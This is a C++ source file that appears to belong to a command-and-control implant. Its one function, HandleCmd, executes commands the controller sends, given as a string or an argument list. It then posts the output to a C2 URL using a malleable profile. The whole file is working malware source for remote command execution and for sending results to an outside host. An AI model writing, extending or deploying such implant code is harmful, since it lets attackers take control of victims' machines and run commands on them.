#include "handlers.h"
#include "debug.h"
#include "utils.h"
#include "constants.h"
#include "implant.h"

using namespace std;

void HandleCmd(Task* task, MalleableProfile* currentProfile)
{
    DEBUG_PRINTF("Executing command\n");
    // Execute command
    SIZE_T cmdOutSize = 0;
    bool success = false;
    LPBYTE output;
    if (task->args->IsString()) {
        output = ExecuteCmd(task->args->GetString(), &cmdOutSize);
    } else if (task->args->IsArray()) {
        vector<string> args;
        for (auto& arg : task->args->GetArray()) {
            args.push_back(arg.GetString());
        }
        output = ExecuteCmdArgVector(args, &cmdOutSize);
        DEBUG_PRINTF("Command output: %s\n", LPBYTEToString(output, cmdOutSize).c_str());
    } else {
        DEBUG_PRINTF("Invalid command arguments\n");
        return;
    }
    
    if (output == NULL)
    {
        DEBUG_PRINTF("Error executing command\n");
        return;
    }

    if (cmdOutSize == 0)
    {
        DEBUG_PRINTF("Command output is empty\n");
    }

    // Send output
    DEBUG_PRINTF("Sending output\n");
    success = true;
    if (!SendTaskResult(task->taskId.c_str(), C2_URL, LPBYTEToString(output, cmdOutSize).c_str(), success, currentProfile))
    {
        DEBUG_PRINTF("Error sending output\n");
    }

    DEBUG_PRINTF("Command output: %s\n", LPBYTEToString(output, cmdOutSize).c_str());
}